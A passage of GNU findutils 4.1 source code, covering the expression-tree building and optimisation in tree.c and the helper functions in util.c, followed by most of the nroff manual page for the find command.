  if (WIFSIGNALED (status))
    {
      error (0, 0, "%s terminated by signal %d",
	     execp->vec[0], WTERMSIG (status));
      exit_status = 1;
      return (false);
    }
  return (!WEXITSTATUS (status));
}

/* Return a static string formatting the time WHEN according to the
   strftime format character KIND.  */

static char *
format_date (when, kind)
     time_t when;
     int kind;
{
  static char fmt[3];
  static char buf[64];		/* More than enough space. */

  if (kind == '@')
    {
      sprintf (buf, "%ld", when);
      return (buf);
    }
  else
    {
      fmt[0] = '%';
      fmt[1] = kind;
      fmt[2] = '\0';
      if (strftime (buf, sizeof (buf), fmt, localtime (&when)))
	return (buf);
    }
  return "";
}

#ifdef	DEBUG
/* Return a pointer to the string representation of 
   the predicate function PRED_FUNC. */

char *
find_pred_name (pred_func)
     PFB pred_func;
{
  int i;

  for (i = 0; pred_table[i].pred_func != 0; i++)
    if (pred_table[i].pred_func == pred_func)
      break;
  return (pred_table[i].pred_name);
}

static char *
type_name (type)
     short type;
{
  int i;

  for (i = 0; type_table[i].type != (short) -1; i++)
    if (type_table[i].type == type)
      break;
  return (type_table[i].type_name);
}

static char *
prec_name (prec)
     short prec;
{
  int i;

  for (i = 0; prec_table[i].prec != (short) -1; i++)
    if (prec_table[i].prec == prec)
      break;
  return (prec_table[i].prec_name);
}

/* Walk the expression tree NODE to stdout.
   INDENT is the number of levels to indent the left margin. */

void
print_tree (node, indent)
     struct predicate *node;
     int indent;
{
  int i;

  if (node == NULL)
    return;
  for (i = 0; i < indent; i++)
    printf ("    ");
  printf ("pred = %s type = %s prec = %s addr = %x\n",
	  find_pred_name (node->pred_func),
	  type_name (node->p_type), prec_name (node->p_prec), node);
  for (i = 0; i < indent; i++)
    printf ("    ");
  printf ("left:\n");
  print_tree (node->pred_left, indent + 1);
  for (i = 0; i < indent; i++)
    printf ("    ");
  printf ("right:\n");
  print_tree (node->pred_right, indent + 1);
}

/* Copy STR into BUF and trim blanks from the end of BUF.
   Return BUF. */

static char *
blank_rtrim (str, buf)
     char *str;
     char *buf;
{
  int i;

  if (str == NULL)
    return (NULL);
  strcpy (buf, str);
  i = strlen (buf) - 1;
  while ((i >= 0) && ((buf[i] == ' ') || buf[i] == '\t'))
    i--;
  buf[++i] = '\0';
  return (buf);
}

/* Print out the predicate list starting at NODE. */

void
print_list (node)
     struct predicate *node;
{
  struct predicate *cur;
  char name[256];

  cur = node;
  while (cur != NULL)
    {
      printf ("%s ", blank_rtrim (find_pred_name (cur->pred_func), name));
      cur = cur->pred_next;
    }
  printf ("\n");
}
#endif	/* DEBUG */
/* tree.c -- helper functions to build and evaluate the expression tree.
   Copyright (C) 1990, 91, 92, 93, 94 Free Software Foundation, Inc.

   This program is free software; you can redistribute it and/or modify
   it under the terms of the GNU General Public License as published by
   the Free Software Foundation; either version 2, or (at your option)
   any later version.

   This program is distributed in the hope that it will be useful,
   but WITHOUT ANY WARRANTY; without even the implied warranty of
   MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
   GNU General Public License for more details.

   You should have received a copy of the GNU General Public License
   along with this program; if not, write to the Free Software
   Foundation, Inc., 675 Mass Ave, Cambridge, MA 02139, USA.  */

#include <config.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <stdio.h>
#include "defs.h"

static struct predicate *scan_rest P_((struct predicate **input, struct predicate *head, int prev_prec));
static void merge_pred P_((struct predicate *beg_list, struct predicate *end_list, struct predicate **last_p));
static struct predicate *set_new_parent P_((struct predicate *curr, enum predicate_precedence high_prec, struct predicate **prevp));

/* Return a pointer to a tree that represents the
   expression prior to non-unary operator *INPUT.
   Set *INPUT to point at the next input predicate node.

   Only accepts the following:
   
   <primary>
   expression		[operators of higher precedence]
   <uni_op><primary>
   (arbitrary expression)
   <uni_op>(arbitrary expression)
   
   In other words, you can not start out with a bi_op or close_paren.

   If the following operator (if any) is of a higher precedence than
   PREV_PREC, the expression just nabbed is part of a following
   expression, which really is the expression that should be handed to
   our caller, so get_expr recurses. */

struct predicate *
get_expr (input, prev_prec)
     struct predicate **input;
     short prev_prec;
{
  struct predicate *next;

  if (*input == NULL)
    error (1, 0, "invalid expression");
  switch ((*input)->p_type)
    {
    case NO_TYPE:
    case BI_OP:
    case CLOSE_PAREN:
      error (1, 0, "invalid expression");
      break;

    case PRIMARY_TYPE:
      next = *input;
      *input = (*input)->pred_next;
      break;

    case UNI_OP:
      next = *input;
      *input = (*input)->pred_next;
      next->pred_right = get_expr (input, NEGATE_PREC);
      break;

    case OPEN_PAREN:
      *input = (*input)->pred_next;
      next = get_expr (input, NO_PREC);
      if ((*input == NULL)
	  || ((*input)->p_type != CLOSE_PAREN))
	error (1, 0, "invalid expression");
      *input = (*input)->pred_next;	/* move over close */
      break;

    default:
      error (1, 0, "oops -- invalid expression type!");
      break;
    }

  /* We now have the first expression and are positioned to check
     out the next operator.  If NULL, all done.  Otherwise, if
     PREV_PREC < the current node precedence, we must continue;
     the expression we just nabbed is more tightly bound to the
     following expression than to the previous one. */
  if (*input == NULL)
    return (next);
  if ((int) (*input)->p_prec > (int) prev_prec)
    {
      next = scan_rest (input, next, prev_prec);
      if (next == NULL)
	error (1, 0, "invalid expression");
    }
  return (next);
}

/* Scan across the remainder of a predicate input list starting
   at *INPUT, building the rest of the expression tree to return.
   Stop at the first close parenthesis or the end of the input list.
   Assumes that get_expr has been called to nab the first element
   of the expression tree.
   
   *INPUT points to the current input predicate list element.
   It is updated as we move along the list to point to the
   terminating input element.
   HEAD points to the predicate element that was obtained
   by the call to get_expr.
   PREV_PREC is the precedence of the previous predicate element. */

static struct predicate *
scan_rest (input, head, prev_prec)
     struct predicate **input;
     struct predicate *head;
     short prev_prec;
{
  struct predicate *tree;	/* The new tree we are building. */

  if ((*input == NULL) || ((*input)->p_type == CLOSE_PAREN))
    return (NULL);
  tree = head;
  while ((*input != NULL) && ((int) (*input)->p_prec > (int) prev_prec))
    {
      switch ((*input)->p_type)
	{
	case NO_TYPE:
	case PRIMARY_TYPE:
	case UNI_OP:
	case OPEN_PAREN:
	  error (1, 0, "invalid expression");
	  break;

	case BI_OP:
	  (*input)->pred_left = tree;
	  tree = *input;
	  *input = (*input)->pred_next;
	  tree->pred_right = get_expr (input, tree->p_prec);
	  break;

	case CLOSE_PAREN:
	  return (tree);

	default:
	  error (1, 0, "oops -- invalid expression type!");
	  break;
	}
    }
  return (tree);
}

/* Optimize the ordering of the predicates in the tree.  Rearrange
   them to minimize work.  Strategies:
   * Evaluate predicates that don't need inode information first;
     the predicates are divided into 1 or more groups separated by
     predicates (if any) which have "side effects", such as printing.
     The grouping implements the partial ordering on predicates which
     those with side effects impose.
   * Place -name, -path, and -regex at the front of a group, with
     -name and -path ahead of -regex.  Predicates that are moved to the
     front of a group by definition do not have side effects.

     This routine "normalizes" the predicate tree by ensuring that
     all expression predicates have AND (or OR or COMMA) parent nodes
     which are linked along the left edge of the expression tree.
     This makes manipulation of subtrees easier.  

     EVAL_TREEP points to the root pointer of the predicate tree
     to be rearranged.  opt_expr may return a new root pointer there.
     Return true if the tree contains side effects, false if not. */

boolean
opt_expr (eval_treep)
     struct predicate **eval_treep;
{
  /* List of -name and -path predicates to move. */
  struct predicate *name_list = NULL;
  struct predicate *end_name_list = NULL;
  /* List of -regex predicates to move. */
  struct predicate *regex_list = NULL;
  struct predicate *end_regex_list = NULL;
  struct predicate *curr;
  struct predicate **prevp;	/* Address of `curr' node. */
  struct predicate **last_sidep; /* Last predicate with side effects. */
  PFB pred_func;
  enum predicate_type p_type;
  boolean has_side_effects = false; /* Return value. */
  enum predicate_precedence prev_prec, /* precedence of last BI_OP in branch */
			    biop_prec; /* topmost BI_OP precedence in branch */


  if (eval_treep == NULL || *eval_treep == NULL)
    return (false);

  /* Set up to normalize tree as a left-linked list of ANDs or ORs.
     Set `curr' to the leftmost node, `prevp' to its address, and
     `pred_func' to the predicate type of its parent. */
  prevp = eval_treep;
  prev_prec = AND_PREC;
  curr = *prevp;
  while (curr->pred_left != NULL)
    {
      prevp = &curr->pred_left;
      prev_prec = curr->p_prec;	/* must be a BI_OP */
      curr = curr->pred_left;
    }

  /* Link in the appropriate BI_OP for the last expression, if needed. */
  if (curr->p_type != BI_OP)
    set_new_parent (curr, prev_prec, prevp);
  
#ifdef DEBUG
  /* Normalized tree. */
  printf ("Normalized Eval Tree:\n");
  print_tree (*eval_treep, 0);
#endif

  /* Rearrange the predicates. */
  prevp = eval_treep;
  if ((*prevp) && (*prevp)->p_type == BI_OP)
    biop_prec = (*prevp)->p_prec;
  while ((curr = *prevp) != NULL)
    {
      /* If there is a BI_OP of different precedence from the first
	 in the pred_left chain, create a new parent of the
	 original precedence, link the new parent to the left of the
	 previous and link CURR to the right of the new parent. 
	 This preserves the precedence of expressions in the tree
	 in case we rearrange them. */
      if (curr->p_type == BI_OP)
	{
          if (curr->p_prec != biop_prec)
	    curr = set_new_parent(curr, biop_prec, prevp);
          else
	    biop_prec = curr->p_prec;
	}
	  
      /* See which predicate type we have. */
      p_type = curr->pred_right->p_type;
      pred_func = curr->pred_right->pred_func;

      switch (p_type)
	{
	case NO_TYPE:
	case PRIMARY_TYPE:
	  /* If it's one of our special primaries, move it to the
	     front of the list for that primary. */
	  if (pred_func == pred_name || pred_func == pred_path)
	    {
	      *prevp = curr->pred_left;
	      curr->pred_left = name_list;
	      name_list = curr;

	      if (end_name_list == NULL)
		end_name_list = curr;

	      continue;
	    }

	  if (pred_func == pred_regex)
	    {
	      *prevp = curr->pred_left;
	      curr->pred_left = regex_list;
	      regex_list = curr;

	      if (end_regex_list == NULL)
		end_regex_list = curr;

	      continue;
	    }

	  break;

	case UNI_OP:
	  /* For NOT, check the expression trees below the NOT. */
	  curr->pred_right->side_effects
	    = opt_expr (&curr->pred_right->pred_right);
	  break;

	case BI_OP:
	  /* For nested AND or OR, recurse (AND/OR form layers on the left of
	     the tree), and continue scanning this level of AND or OR. */
	  curr->pred_right->side_effects = opt_expr (&curr->pred_right);
	  break;

	  /* At this point, get_expr and scan_rest have already removed
	     all of the user's parentheses. */

	default:
	  error (1, 0, "oops -- invalid expression type!");
	  break;
	}

      if (curr->pred_right->side_effects == true)
	{
	  last_sidep = prevp;

	  /* Incorporate lists and reset list pointers for this group.  */
	  if (name_list != NULL)
	    {
	      merge_pred (name_list, end_name_list, last_sidep);
	      name_list = end_name_list = NULL;
	    }

	  if (regex_list != NULL)
	    {
	      merge_pred (regex_list, end_regex_list, last_sidep);
	      regex_list = end_regex_list = NULL;
	    }

	  has_side_effects = true;
	}

      prevp = &curr->pred_left;
    }

  /* Do final list merges. */
  last_sidep = prevp;
  if (name_list != NULL)
    merge_pred (name_list, end_name_list, last_sidep);
  if (regex_list != NULL)
    merge_pred (regex_list, end_regex_list, last_sidep);

  return (has_side_effects);
}

/* Link in a new parent BI_OP node for CURR, at *PREVP, with precedence
   HIGH_PREC. */

static struct predicate *
set_new_parent (curr, high_prec, prevp)
     struct predicate *curr;
     enum predicate_precedence high_prec;
     struct predicate **prevp;
{
  struct predicate *new_parent;

  new_parent = (struct predicate *) xmalloc (sizeof (struct predicate));
  new_parent->p_type = BI_OP;
  new_parent->p_prec = high_prec;
  new_parent->need_stat = false;

  switch (high_prec)
    {
    case COMMA_PREC:
      new_parent->pred_func = pred_comma;
      break;
    case OR_PREC:
      new_parent->pred_func = pred_or;
      break;
    case AND_PREC:
      new_parent->pred_func = pred_and;
      break;
    default:
      ;				/* empty */
    }
  
  new_parent->side_effects = false;
  new_parent->args.str = NULL;
  new_parent->pred_next = NULL;

  /* Link in new_parent.
     Pushes rest of left branch down 1 level to new_parent->pred_right. */
  new_parent->pred_left = NULL;
  new_parent->pred_right = curr;
  *prevp = new_parent;

#ifdef	DEBUG
  new_parent->p_name = (char *) find_pred_name (new_parent->pred_func);
#endif /* DEBUG */

  return (new_parent);
}

/* Merge the predicate list that starts at BEG_LIST and ends at END_LIST
   into the tree at LAST_P. */

static void
merge_pred (beg_list, end_list, last_p)
     struct predicate *beg_list, *end_list, **last_p;
{
  end_list->pred_left = *last_p;
  *last_p = beg_list;
}

/* Find the first node in expression tree TREE that requires
   a stat call and mark the operator above it as needing a stat
   before calling the node.   Since the expression precedences 
   are represented in the tree, some preds that need stat may not
   get executed (because the expression value is determined earlier.)
   So every expression needing stat must be marked as such, not just
   the earliest, to be sure to obtain the stat.  This still guarantees 
   that a stat is made as late as possible.  Return true if the top node 
   in TREE requires a stat, false if not. */

boolean
mark_stat (tree)
     struct predicate *tree;
{
  /* The tree is executed in-order, so walk this way (apologies to Aerosmith)
     to find the first predicate for which the stat is needed. */
  switch (tree->p_type)
    {
    case NO_TYPE:
    case PRIMARY_TYPE:
      return tree->need_stat;

    case UNI_OP:
      if (mark_stat (tree->pred_right))
	tree->need_stat = true;
      return (false);

    case BI_OP:
      /* ANDs and ORs are linked along ->left ending in NULL. */
      if (tree->pred_left != NULL)
	mark_stat (tree->pred_left);

      if (mark_stat (tree->pred_right))
	tree->need_stat = true;

      return (false);

    default:
      error (1, 0, "oops -- invalid expression type!");
      return (false);
    }
}
/* util.c -- functions for initializing new tree elements, and other things.
   Copyright (C) 1990, 91, 92, 93, 94 Free Software Foundation, Inc.

   This program is free software; you can redistribute it and/or modify
   it under the terms of the GNU General Public License as published by
   the Free Software Foundation; either version 2, or (at your option)
   any later version.

   This program is distributed in the hope that it will be useful,
   but WITHOUT ANY WARRANTY; without even the implied warranty of
   MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
   GNU General Public License for more details.

   You should have received a copy of the GNU General Public License
   along with this program; if not, write to the Free Software
   Foundation, Inc., 675 Mass Ave, Cambridge, MA 02139, USA.  */

#include <config.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <stdio.h>
#include "defs.h"

/* Return the last component of pathname FNAME, with leading slashes
   compressed into one slash. */

char *
basename (fname)
     char *fname;
{
  char *p;

  /* For "/", "//", etc., return "/". */
  for (p = fname; *p == '/'; ++p)
    /* Do nothing. */ ;
  if (*p == '\0')
    return p - 1;
  p = strrchr (fname, '/');
  return (p == NULL ? fname : p + 1);
}

/* Return a pointer to a new predicate structure, which has been
   linked in as the last one in the predicates list.

   Set `predicates' to point to the start of the predicates list.
   Set `last_pred' to point to the new last predicate in the list.
   
   Set all cells in the new structure to the default values. */

struct predicate *
get_new_pred ()
{
  register struct predicate *new_pred;

  if (predicates == NULL)
    {
      predicates = (struct predicate *)
	xmalloc (sizeof (struct predicate));
      last_pred = predicates;
    }
  else
    {
      new_pred = (struct predicate *) xmalloc (sizeof (struct predicate));
      last_pred->pred_next = new_pred;
      last_pred = new_pred;
    }
  last_pred->pred_func = NULL;
#ifdef	DEBUG
  last_pred->p_name = NULL;
#endif	/* DEBUG */
  last_pred->p_type = NO_TYPE;
  last_pred->p_prec = NO_PREC;
  last_pred->side_effects = false;
  last_pred->need_stat = true;
  last_pred->args.str = NULL;
  last_pred->pred_next = NULL;
  last_pred->pred_left = NULL;
  last_pred->pred_right = NULL;
  return (last_pred);
}

/* Return a pointer to a new predicate, with operator check.
   Like get_new_pred, but it checks to make sure that the previous
   predicate is an operator.  If it isn't, the AND operator is inserted. */

struct predicate *
get_new_pred_chk_op ()
{
  struct predicate *new_pred;

  if (last_pred)
    switch (last_pred->p_type)
      {
      case NO_TYPE:
	error (1, 0, "oops -- invalid default insertion of and!");
	break;

      case PRIMARY_TYPE:
      case CLOSE_PAREN:
	new_pred = get_new_pred ();
	new_pred->pred_func = pred_and;
#ifdef	DEBUG
	new_pred->p_name = find_pred_name (pred_and);
#endif	/* DEBUG */
	new_pred->p_type = BI_OP;
	new_pred->p_prec = AND_PREC;
	new_pred->need_stat = false;
	new_pred->args.str = NULL;

      default:
	break;
      }
  return (get_new_pred ());
}

/* Add a primary of predicate type PRED_FUNC to the predicate input list.

   Return a pointer to the predicate node just inserted.

   Fills in the following cells of the new predicate node:

   pred_func	    PRED_FUNC
   args(.str)	    NULL
   p_type	    PRIMARY_TYPE
   p_prec	    NO_PREC

   Other cells that need to be filled in are defaulted by
   get_new_pred_chk_op, which is used to insure that the prior node is
   either not there at all (we are the very first node) or is an
   operator. */

struct predicate *
insert_primary (pred_func)
     boolean (*pred_func) ();
{
  struct predicate *new_pred;

  new_pred = get_new_pred_chk_op ();
  new_pred->pred_func = pred_func;
#ifdef	DEBUG
  new_pred->p_name = find_pred_name (pred_func);
#endif	/* DEBUG */
  new_pred->args.str = NULL;
  new_pred->p_type = PRIMARY_TYPE;
  new_pred->p_prec = NO_PREC;
  return (new_pred);
}

void
usage (msg)
     char *msg;
{
  if (msg)
    fprintf (stderr, "%s: %s\n", program_name, msg);
  fprintf (stderr, "\
Usage: %s [path...] [expression]\n", program_name);
  exit (1);
}
char *version_string = "4.1";
.TH FIND 1L \" -*- nroff -*-
.SH NAME
find \- search for files in a directory hierarchy
.SH SYNOPSIS
.B find
[path...] [expression]
.SH DESCRIPTION
This manual page
documents the GNU version of
.BR find .
.B find
searches the directory tree rooted at each given file name by
evaluating the given expression from left to right, according to the
rules of precedence (see section OPERATORS), until the outcome is
known (the left hand side is false for \fIand\fR operations, true for
\fIor\fR), at which point
.B find
moves on to the next file name.
.PP
The first argument that begins with `\-', `(', `)', `,', or `!' is taken
to be the beginning of the expression; any arguments before it are
paths to search, and any arguments after it are the rest of the
expression.  If no paths are given, the current directory is used.  If
no expression is given, the expression `\-print' is used.
.PP
.B find
exits with status 0 if all files are processed successfully, greater
than 0 if errors occur.
.SH EXPRESSIONS
.P
The expression is made up of options (which affect overall operation
rather than the processing of a specific file, and always return true),
tests (which return a true or false value), and actions (which have side
effects and return a true or false value), all separated by operators.
\-and is assumed where the operator is omitted.  If the expression contains
no actions other than \-prune, \-print is performed on all files
for which the expression is true.
.SS OPTIONS
.P
All options always return true.  They always take effect, rather than
being processed only when their place in the expression is reached.
Therefore, for clarity, it is best to place them at the beginning of
the expression.
.IP \-daystart
Measure times (for \-amin, \-atime, \-cmin, \-ctime, \-mmin, and \-mtime)
from the beginning of today rather than from 24 hours ago.
.IP \-depth
Process each directory's contents before the directory itself.
.IP \-follow
Dereference symbolic links.  Implies \-noleaf.
.IP "\-help, \-\-help"
Print a summary of the command-line usage of
.B find
and exit.
.IP "\-maxdepth \fIlevels\fR"
Descend at most \fIlevels\fR (a non-negative integer) levels of
directories below the command line arguments.  `\-maxdepth 0' means
only apply the tests and actions to the command line arguments.
.IP "\-mindepth \fIlevels\fR"
Do not apply any tests or actions at levels less than \fIlevels\fR (a
non-negative integer).  `\-mindepth 1' means process all files except
the command line arguments.
.IP \-mount
Don't descend directories on other filesystems.  An alternate name for
\-xdev, for compatibility with some other versions of
.BR find .
.IP "\-noleaf"
Do not optimize by assuming that directories contain 2 fewer
subdirectories than their hard link count.  This option is needed when
searching filesystems that do not follow the Unix directory-link
convention, such as CD-ROM or MS-DOS filesystems or AFS volume mount
points.  Each directory on a normal Unix filesystem has at least 2
hard links: its name and its `.'  entry.  Additionally, its
subdirectories (if any) each have a `..'  entry linked to that
directory.  When
.B find
is examining a directory, after it has statted 2 fewer subdirectories
than the directory's link count, it knows that the rest of the entries
in the directory are non-directories (`leaf' files in the directory
tree).  If only the files' names need to be examined, there is no need
to stat them; this gives a significant increase in search speed.
.IP "\-version, \-\-version"
Print the \fBfind\fR version number and exit.
.IP \-xdev
Don't descend directories on other filesystems.
.SS TESTS
.P
Numeric arguments can be specified as
.IP \fI+n\fP
for greater than
.IR n ,
.IP \fI\-n\fP
for less than
.IR n ,
.IP \fIn\fP
for exactly
.IR n .
.IP "\-amin \fIn\fR"
File was last accessed \fIn\fR minutes ago.
.IP "\-anewer \fIfile\fR"
File was last accessed more recently than \fIfile\fR was modified.
\-anewer is affected by \-follow only if \-follow comes before
\-anewer on the command line.
.IP "\-atime \fIn\fR"
File was last accessed \fIn\fR*24 hours ago.
.IP "\-cmin \fIn\fR"
File's status was last changed \fIn\fR minutes ago.
.IP "\-cnewer \fIfile\fR"
File's status was last changed more recently than \fIfile\fR was modified.
\-cnewer is affected by \-follow only if \-follow comes before
\-cnewer on the command line.
.IP "\-ctime \fIn\fR"
File's status was last changed \fIn\fR*24 hours ago.
.IP \-empty
File is empty and is either a regular file or a directory.
.IP \-false
Always false.
.IP "\-fstype \fItype\fR"
File is on a filesystem of type \fItype\fR.  The valid filesystem
types vary among different versions of Unix; an incomplete list of
filesystem types that are accepted on some version of Unix or another
is: ufs, 4.2, 4.3, nfs, tmp, mfs, S51K, S52K.  You can use \-printf
with the %F directive to see the types of your filesystems.
.IP "\-gid \fIn\fR"
File's numeric group ID is \fIn\fR.
.IP "\-group \fIgname\fR"
File belongs to group \fIgname\fR (numeric group ID allowed).
.IP "\-ilname \fIpattern\fR"
Like \-lname, but the match is case insensitive.
.IP "\-iname \fIpattern\fR"
Like \-name, but the match is case insensitive.  For example, the
patterns `fo*' and `F??' match the file names `Foo', `FOO', `foo',
`fOo', etc.
.IP "\-inum \fIn\fR"
File has inode number \fIn\fR.
.IP "\-ipath \fIpattern\fR"
Like \-path, but the match is case insensitive.
.IP "\-iregex \fIpattern\fR"
Like \-regex, but the match is case insensitive.
.IP "\-links \fIn\fR"
File has \fIn\fR links.
.IP "\-lname \fIpattern\fR"
File is a symbolic link whose contents match shell pattern
\fIpattern\fR.  The metacharacters do not treat `/' or `.' specially.
.IP "\-mmin \fIn\fR"
File's data was last modified \fIn\fR minutes ago.
.IP "\-mtime \fIn\fR"
File's data was last modified \fIn\fR*24 hours ago.
.IP "\-name \fIpattern\fR"
Base of file name (the path with the leading directories removed)
matches shell pattern \fIpattern\fR.  The metacharacters (`*', `?',
and `[]') do not match a `.' at the start of the base name.  To ignore
a directory and the files under it, use \-prune; see an example in the
description of \-path.
.IP "\-newer \fIfile\fR"
File was modified more recently than \fIfile\fR.
\-newer is affected by \-follow only if \-follow comes before
\-newer on the command line.
.IP \-nouser
No user corresponds to file's numeric user ID.
.IP \-nogroup
No group corresponds to file's numeric group ID.
.IP "\-path \fIpattern\fR"
File name matches shell pattern \fIpattern\fR.  The metacharacters do
not treat `/' or `.' specially; so, for example,
.br
.in +1i
find . \-path './sr*sc'
.br
.in -1i
will print an entry for a directory called './src/misc' (if one
exists).  To ignore a whole directory tree, use \-prune rather than
checking every file in the tree.  For example, to skip the
directory `src/emacs' and all files and directories under it, and
print the names of the other files found, do something like this:
.br
.in +1i
find . \-path './src/emacs' -prune -o -print
.br
.in -1i
.IP "\-perm \fImode\fR"
File's permission bits are exactly \fImode\fR (octal or symbolic).
Symbolic modes use mode 0 as a point of departure.
.IP "\-perm \-\fImode\fR"
All of the permission bits \fImode\fR are set for the file.
.IP "\-perm +\fImode\fR"
Any of the permission bits \fImode\fR are set for the file.
.IP "\-regex \fIpattern\fR"
File name matches regular expression \fIpattern\fR.  This is a match
on the whole path, not a search.  For example, to match a file named
`./fubar3', you can use the regular expression `.*bar.' or `.*b.*3',
but not `b.*r3'.
.IP "\-size \fIn\fR[bckw]"
File uses \fIn\fP units of space.  The units are 512-byte blocks by
default or if `b' follows \fIn\fP, bytes if `c' follows \fIn\fP,
kilobytes if `k' follows \fIn\fP, or 2-byte words if `w' follows \fIn\fP.
The size does not count indirect blocks, but it does count blocks in
sparse files that are not actually allocated.
.IP \-true
Always true.
.IP "\-type \fIc\fR"
File is of type \fIc\fR:
.RS
.IP b
block (buffered) special
.IP c
character (unbuffered) special
.IP d
directory
.IP p
named pipe (FIFO)
.IP f
regular file
.IP l
symbolic link
.IP s
socket
.RE
.IP "\-uid \fIn\fR"
File's numeric user ID is \fIn\fR.
.IP "\-used \fIn\fR"
File was last accessed \fIn\fR days after its status was last changed.
.IP "\-user \fIuname\fR"
File is owned by user \fIuname\fR (numeric user ID allowed).
.IP "\-xtype \fIc\fR"
The same as \-type unless the file is a symbolic link.  For symbolic
links: if \-follow has not been given, true if the file is a link to a
file of type \fIc\fR; if \-follow has been given, true if \fIc\fR is
`l'.  In other words, for symbolic links, \-xtype checks the type of
the file that \-type does not check.
.SS ACTIONS
.IP "\-exec \fIcommand\fR ;"
Execute \fIcommand\fR; true if 0 status is returned.  All following
arguments to
.B find
are taken to be arguments to the command until an argument consisting
of `;' is encountered.  The string `{}' is replaced by the current
file name being processed everywhere it occurs in the arguments to the
command, not just in arguments where it is alone, as in some versions
of
.BR find .
Both of these constructions might need to be escaped (with a `\e') or
quoted to protect them from expansion by the shell.  The command is
executed in the starting directory.
.IP "\-fls \fIfile\fR"
True; like \-ls but write to \fIfile\fR like \-fprint.
.IP "\-fprint \fIfile\fR"
True; print the full file name into file \fIfile\fR.  If \fIfile\fR
does not exist when \fBfind\fR is run, it is created; if it does
exist, it is truncated.  The file names ``/dev/stdout'' and
``/dev/stderr'' are handled specially; they refer to the standard
output and standard error output, respectively.
.IP "\-fprint0 \fIfile\fR"
True; like \-print0 but write to \fIfile\fR like \-fprint.
.IP "\-fprintf \fIfile\fR \fIformat\fR"
True; like \-printf but write to \fIfile\fR like \-fprint.
.IP "\-ok \fIcommand\fR ;"
Like \-exec but ask the user first (on the standard input); if the
response does not start with `y' or `Y', do not run the command, and
return false.
.IP \-print
True; print the full file name on the standard output, followed by a newline.
.IP \-print0
True; print the full file name on the standard output, followed by a
null character.  This allows file names that contain newlines to be
correctly interpreted by programs that process the \fBfind\fR output.
.IP "\-printf \fIformat\fR"
True; print \fIformat\fR on the standard output, interpreting `\e'
escapes and `%' directives.  Field widths and precisions can be
specified as with the `printf' C function.  Unlike \-print, \-printf
does not add a newline at the end of the string.  The escapes and
directives are:
.RS
.IP \ea
Alarm bell.
.IP \eb
Backspace.
.IP \ec
Stop printing from this format immediately and flush the output.
.IP \ef
Form feed.
.IP \en
Newline.
.IP \er
Carriage return.
.IP \et
Horizontal tab.
.IP \ev
Vertical tab.
.IP \e\e
A literal backslash (`\e').
.PP
A `\e' character followed by any other character is treated as an
ordinary character, so they both are printed.
.IP %%
A literal percent sign.
.IP %a
File's last access time in the format returned by the C `ctime' function.
.IP %A\fIk\fP
File's last access time in the format specified by \fIk\fR, which is
either `@' or a directive for the C `strftime' function.  The possible
values for \fIk\fR are listed below; some of them might not be
available on all systems, due to differences in `strftime' between
systems.
.RS
.IP @
seconds since Jan. 1, 1970, 00:00 GMT.
.PP
Time fields:
.IP H
hour (00..23)
.IP I
hour (01..12)
.IP k
hour ( 0..23)
.IP l
hour ( 1..12)
.IP M
minute (00..59)
.IP p
locale's AM or PM
.IP r
time, 12-hour (hh:mm:ss [AP]M)
.IP S
second (00..61)
.IP T
time, 24-hour (hh:mm:ss)
.IP X
locale's time representation (H:M:S)
.IP Z
time zone (e.g., EDT), or nothing if no time zone is determinable
.PP
Date fields:
.IP a
locale's abbreviated weekday name (Sun..Sat)
.IP A
locale's full weekday name, variable length (Sunday..Saturday)
.IP b
locale's abbreviated month name (Jan..Dec)
.IP B
locale's full month name, variable length (January..December)
.IP c
locale's date and time (Sat Nov 04 12:02:33 EST 1989)
.IP d
day of month (01..31)
.IP D
date (mm/dd/yy)
.IP h
same as b
.IP j
day of year (001..366)
.IP m
month (01..12)
.IP U
week number of year with Sunday as first day of week (00..53)
.IP w
day of week (0..6)
.IP W
week number of year with Monday as first day of week (00..53)
.IP x
locale's date representation (mm/dd/yy)
.IP y
last two digits of year (00..99)
.IP Y
year (1970...)
.RE
.IP %b
File's size in 512-byte blocks (rounded up).
.IP %c
File's last status change time in the format returned by the C `ctime'
function.
.IP %C\fIk\fP
File's last status change time in the format specified by \fIk\fR,
which is the same as for %A.
.IP %d
File's depth in the directory tree; 0 means the file is a command line
argument.
.IP %f
File's name with any leading directories removed (only the last element).
.IP %F
Type of the filesystem the file is on; this value can be used for
\-fstype.
.IP %g
File's group name, or numeric group ID if the group has no name.
.IP %G
File's numeric group ID.
.IP %h
Leading directories of file's name (all but the last element).
.IP %H
Command line argument under which file was found.
.IP %i
File's inode number (in decimal).
.IP %k
File's size in 1K blocks (rounded up).
.IP %l
Object of symbolic link (empty string if file is not a symbolic link).
.IP %m
File's permission bits (in octal).
.IP %n
Number of hard links to file.
.IP %p
File's name.
.IP %P
File's name with the name of the command line argument under which
it was found removed.
.IP %s
File's size in bytes.
.IP %t
File's last modification time in the format returned by the C `ctime'
function.
.IP %T\fIk\fP
File's last modification time in the format specified by \fIk\fR, 
which is the same as for %A.
.IP %u
File's user name, or numeric user ID if the user has no name.
.IP %U
File's numeric user ID.
.PP
A `%' character followed by any other character is discarded (but the
other character is printed).
.RE
.IP \-prune
If \-depth is not given, true; do not descend the current directory.
.br
If \-depth is given, false; no effect.
.IP \-ls
True; list current file in `ls \-dils' format on standard output.
The block counts are of 1K blocks, unless the environment variable
POSIXLY_CORRECT is set, in which case 512-byte blocks are used.
.SS OPERATORS
.P
Listed in order of decreasing precedence:
.IP "( \fIexpr\fR )"
Force precedence.
.IP "! \fIexpr\fR"
True if \fIexpr\fR is false.
.IP "\-not \fIexpr\fR"
Same as ! \fIexpr\fR.
.IP "\fIexpr1 expr2\fR"
And (implied); \fIexpr2\fR is not evaluated if \fIexpr1\fR is false.
.IP "\fIexpr1\fR \-a \fIexpr2\fR"
Same as \fIexpr1 expr2\fR.
.IP "\fIexpr1\fR \-and \fIexpr2\fR"
Same as \fIexpr1 expr2\fR.
.IP "\fIexpr1\fR \-o \fIexpr2\fR"
Or; \fIexpr2\fR is not evaluated if \fIexpr1\fR is true.
.IP "\fIexpr1\fR \-or \fIexpr2\fR"
Same as \fIexpr1\fR \-o \fIexpr2\fR.
.IP "\fIexpr1\fR , \fIexpr2\fR"
List; both \fIexpr1\fR and \fIexpr2\fR are always evaluated.
The value of \fIexpr1\fR is discarded; the value of the list is the
value of \fIexpr2\fR.
.SH "SEE ALSO"
